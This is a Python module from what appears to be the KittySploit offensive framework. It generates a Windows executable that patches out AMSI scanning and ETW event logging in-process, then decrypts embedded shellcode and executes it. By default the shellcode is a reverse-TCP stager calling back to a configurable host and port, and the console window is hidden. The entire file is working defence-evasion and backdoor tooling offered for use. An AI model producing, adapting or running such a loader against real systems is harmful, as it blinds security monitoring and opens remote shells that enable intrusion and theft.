#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
In-process ETW/AMSI patch evasion loader.

Patches AmsiScanBuffer and/or EtwEventWrite in-process, decrypts embedded
shellcode, and executes via CreateThread.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_c_backdoor, option_value
from lib.compile.etw_amsi_patch import EtwAmsiPatchBuilder


class Module(Backdoor):
    __info__ = {
        "name": "ETW/AMSI Patch Evasion",
        "description": (
            "Generate a Windows x64 EXE that patches AMSI (AmsiScanBuffer) and/or "
            "ETW (EtwEventWrite) in-process before decrypting and running shellcode."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1562/001/",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    patch_amsi = OptBool(True, "Patch amsi.dll!AmsiScanBuffer", False)
    patch_etw = OptBool(True, "Patch ntdll.dll!EtwEventWrite", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(3000, "Sleep milliseconds after patching, before thread start", False)
    output_name = OptString("etw_amsi_patch.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem (windows hides console)",
        False,
        ["windows", "console"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        if not option_value(self, "patch_amsi") and not option_value(self, "patch_etw"):
            print_error("Enable at least one of patch_amsi or patch_etw.")
            return False

        builder = EtwAmsiPatchBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_c_backdoor(
            self,
            builder,
            build_source_kwargs={
                "patch_amsi": bool(option_value(self, "patch_amsi")),
                "patch_etw": bool(option_value(self, "patch_etw")),
            },
            output_name="etw_amsi_patch.exe",
            save_source_name="etw_amsi_patch.c",
        )
        if ok:
            print_info(
                f"AMSI patch: {option_value(self, 'patch_amsi')} | "
                f"ETW patch: {option_value(self, 'patch_etw')} | "
                f"Cipher: {option_value(self, 'cipher')}"
            )
        return ok
